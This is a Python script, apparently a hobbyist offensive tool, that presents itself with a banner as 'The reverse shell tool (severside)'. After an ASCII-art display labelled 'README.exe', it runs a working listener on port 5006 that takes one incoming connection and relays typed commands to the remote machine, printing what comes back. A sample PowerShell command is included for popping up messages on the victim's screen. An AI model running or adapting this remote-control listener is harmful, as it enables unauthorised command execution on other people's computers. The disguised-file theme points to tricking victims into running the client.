import socket

cool_Hacker_opening = """
 ________  _______   ________  ________  _____ ______   _______       _______      ___    ___ _______
|\\   __  \\|\  ___ \\ |\\   __  \\|\\   ___ \\|\\   _ \\  _   \\|\\  ___ \\     |\\  ___ \\    |\\  \\  /  /|\\  ___ \\
\\ \\  \\|\\  \\ \\   __/|\\ \\  \\|\\  \\ \\  \\_|\\ \\ \\  \\\\\\__\\ \\  \\ \\   __/|    \\ \\   __/|   \\ \\  \\/  / | \\   __/|
 \\ \\   _  _\\ \\  \\_|/_\\ \\   __  \\ \\  \\ \\\\ \\ \\  \\\\|__| \\  \\ \\  \\_|/__   \\ \\  \\_|/__  \\ \\    / / \\ \\  \\_|/__
  \\ \\  \\\\  \\\\ \\  \\_|\\ \\ \\  \\ \\  \\ \\  \\_\\\\ \\ \\  \\    \\ \\  \\ \\  \\_|\\ \\ __\\ \\  \\_|\\ \\  /     \\/   \\ \\  \\_|\\ \\
   \\ \\__\\\\ _\\\\ \\_______\\ \\__\\ \\__\\ \\_______\\ \\__\\    \\ \\__\\ \\_______\\\\__\\ \\_______\\/  /\\   \\    \\ \\_______\\
    \\|__|\\|__|\\|_______|\\|__|\\|__|\\|_______|\\|__|     \\|__|\\|_______\\|__|\\|_______/__/ /\\ __\\    \\|_______|
                                                                                  |__|/ \\|__|

        #      #
      #     #      #
   # #   ##  ###   #   #
       #    #    ##   #  ##
  #  ##   ##   ###   #
    /\\# ###/\\  #  _/*\\  #
   /*@*\\__/**\\/\\/*&@*|   #
   \*% ________ *%$#!*\\
    | |        | \\**^%*|
    |\\| ~~~~~~~L___\\*!@/
     \\| ~~~~~~~~~~~ |/
      | ~~~~~~~~~~~ |
      | ~~~~~~~~~~~ |
      | ~~~~~~~~~~~ |
      | ~~~~~~~~~~~ |
      | ~~~~~~~~~~~ |
      | ~~~~~~~~~~~ |
      .-------------.
        README.exe

"""

print("\n\n\n\n\n\n\n\n"+cool_Hacker_opening)
print("\n\n\nThe reverse shell tool (severside)\n\n")
print("If you want to send a message to the person on the other end type:\nPowerShell -Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Hello World')\"")
#"0.0.0.0" is any ipv4 address the computer is listed as in any network
host = "0.0.0.0"
port = 5006
#buffer of 1024kb
buffer = 1024

s = socket.socket()
s.bind((host,port))
s.listen(1) #the number is how many connections it will take before refusing anymore

print(f"\nstarted listening on port {port}...")

client_socket, client_addr = s.accept()

print(f"connection made with {str(client_addr)}")
#this is the command execution part
while True:
    #input and sending the command
    command = input(">>>")
    client_socket.send(command.encode())
    if command.lower() == "quit":
        break
    #retrieve response
    response = client_socket.recv(buffer).decode()
    print(response)
client_socket.close()
s.close()
